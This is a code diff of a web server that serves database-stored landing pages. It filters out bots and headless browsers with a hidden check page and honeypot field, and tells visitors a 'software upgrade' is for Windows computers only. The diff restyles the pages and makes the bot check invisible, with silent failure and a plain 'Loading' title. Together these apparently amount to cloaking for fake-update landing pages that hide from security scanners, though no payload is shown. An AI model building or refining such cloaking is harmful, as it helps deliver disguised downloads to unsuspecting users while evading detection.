@@ -177,11 +177,11 @@ function logBotBlock(ip, ua, reason, blockType, reqPath) {
 
 function blockedPage(reason) {
   return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access Denied</title></head>
-<body style="font-family:'Segoe UI',sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
-<div style="text-align:center;max-width:420px;padding:40px;background:#161922;border:1px solid #1e2230;border-radius:16px;">
-<svg width="48" height="48" viewBox="0 0 24 24" fill="#ef4444" style="margin-bottom:16px;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-<h1 style="font-size:1.2rem;color:#fff;margin-bottom:8px;">Access Denied</h1>
-<p style="color:#94a3b8;font-size:0.85rem;">${reason}</p>
+<body style="font-family:'Segoe UI',sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
+<div style="text-align:center;max-width:420px;padding:40px;background:#f8f9fa;border:1px solid #e0e0e0;border-radius:16px;box-shadow:0 2px 12px rgba(0,0,0,0.06);">
+<svg width="48" height="48" viewBox="0 0 24 24" fill="#dc2626" style="margin-bottom:16px;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+<h1 style="font-size:1.2rem;color:#1a1a1a;margin-bottom:8px;">Access Denied</h1>
+<p style="color:#6b7280;font-size:0.85rem;">${reason}</p>
 </div></body></html>`;
 }
 
@@ -260,34 +260,14 @@ function logVisitor(ip, ipData, ua, reqPath, pageId, isBlocked, blockReason) {
 }
 
 function challengePageHtml(nonce, originalUrl) {
-  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.card{text-align:center;max-width:440px;padding:48px 40px;background:#161922;border:1px solid #1e2230;border-radius:16px}
-.spinner{width:48px;height:48px;border:4px solid #1e2230;border-top:4px solid #818cf8;border-radius:50%;margin:0 auto 24px;animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-h1{font-size:1.15rem;color:#fff;margin-bottom:8px}
-p{color:#94a3b8;font-size:0.85rem;margin-bottom:20px}
-.progress{width:100%;height:4px;background:#1e2230;border-radius:4px;overflow:hidden}
-.bar{height:100%;width:0%;background:linear-gradient(90deg,#818cf8,#6366f1);border-radius:4px;transition:width 3s linear}
-.fail{color:#ef4444;display:none;margin-top:16px;font-size:0.85rem}
-.hp{position:absolute;left:-9999px;opacity:0;height:0}
-</style></head><body>
-<div class="card">
-<div class="spinner" id="spinner"></div>
-<h1 id="status-text">Verifying your browser...</h1>
-<p>This is an automatic security check. Please wait.</p>
-<div class="progress"><div class="bar" id="bar"></div></div>
+  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Loading</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;}.hp{position:absolute;left:-9999px;opacity:0;height:0}</style></head><body>
 <input type="text" name="website" id="hp_website" class="hp" tabindex="-1" autocomplete="off">
-<p class="fail" id="fail-msg">Verification failed. Please try again later.</p>
-</div>
 <script>
 (function(){
 var startTime=Date.now();
 var nonce="${nonce}";
 var origUrl="${originalUrl.replace(/"/g, '\\"')}";
-document.getElementById("bar").style.width="100%";
 var checks={
 webdriver:navigator.webdriver===true,
 phantom:!!window._phantom||!!window.phantom,
@@ -318,21 +298,13 @@ xhr.setRequestHeader("Content-Type","application/json");
 xhr.onload=function(){
 if(xhr.status===200){
 try{var r=JSON.parse(xhr.responseText);
-if(r.ok){document.getElementById("status-text").textContent="Verified. Redirecting...";
-document.getElementById("spinner").style.borderTopColor="#22c55e";
-setTimeout(function(){window.location.href=origUrl||window.location.href;},500);
-}else{showFail();}}catch(e){showFail();}
-}else{showFail();}
+if(r.ok){window.location.href=origUrl||window.location.href;}
+}catch(e){}
+}
 };
-xhr.onerror=function(){showFail();};
+xhr.onerror=function(){};
 xhr.send(JSON.stringify(payload));
 },3000);
-function showFail(){
-document.getElementById("status-text").textContent="Verification Failed";
-document.getElementById("spinner").style.borderTopColor="#ef4444";
-document.getElementById("spinner").style.animationPlayState="paused";
-document.getElementById("fail-msg").style.display="block";
-}
 })();
 </script></body></html>`;
 }
@@ -422,11 +394,11 @@ function isWindows(userAgent) {
 
 function windowsOnlyPage() {
   return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Windows Only</title></head>
-<body style="font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
-<div style="text-align:center;max-width:480px;padding:40px;background:#161922;border:1px solid #1e2230;border-radius:16px;">
-<svg width="64" height="64" viewBox="0 0 24 24" fill="#818cf8" style="margin-bottom:20px;"><path d="M3 12V6.75l6-1.32v6.48L3 12zm17-9v8.75l-10 .08V5.21L20 3zM3 13l6 .09v6.81l-6-1.15V13zm7 .18l10 .08V21l-10-1.84V13.18z"/></svg>
-<h1 style="font-size:1.4rem;color:#fff;margin-bottom:12px;">Windows Only</h1>
-<p style="color:#94a3b8;font-size:0.95rem;line-height:1.6;">This software upgrade is for Windows computers only. Please switch to a Windows computer to access the software.</p>
+<body style="font-family:'Segoe UI',Tahoma,sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
+<div style="text-align:center;max-width:480px;padding:40px;background:#f8f9fa;border:1px solid #e0e0e0;border-radius:16px;box-shadow:0 2px 12px rgba(0,0,0,0.06);">
+<svg width="64" height="64" viewBox="0 0 24 24" fill="#2563eb" style="margin-bottom:20px;"><path d="M3 12V6.75l6-1.32v6.48L3 12zm17-9v8.75l-10 .08V5.21L20 3zM3 13l6 .09v6.81l-6-1.15V13zm7 .18l10 .08V21l-10-1.84V13.18z"/></svg>
+<h1 style="font-size:1.4rem;color:#1a1a1a;margin-bottom:12px;">Windows Only</h1>
+<p style="color:#6b7280;font-size:0.95rem;line-height:1.6;">This software upgrade is for Windows computers only. Please switch to a Windows computer to access the software.</p>
 </div></body></html>`;
 }
 
@@ -1126,7 +1098,7 @@ app.get('/api/stats', requireAuth, async (req, res) => {
 app.get('/page/:id', async (req, res) => {
   const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
   if (!page || !page.html_code) {
-    return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;color:#fff;">Page Not Found</h1><p style="color:#64748b;">This landing page does not exist.</p></div></body></html>');
+    return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;color:#1a1a1a;">Page Not Found</h1><p style="color:#6b7280;">This landing page does not exist.</p></div></body></html>');
   }
 
   // Windows-only check
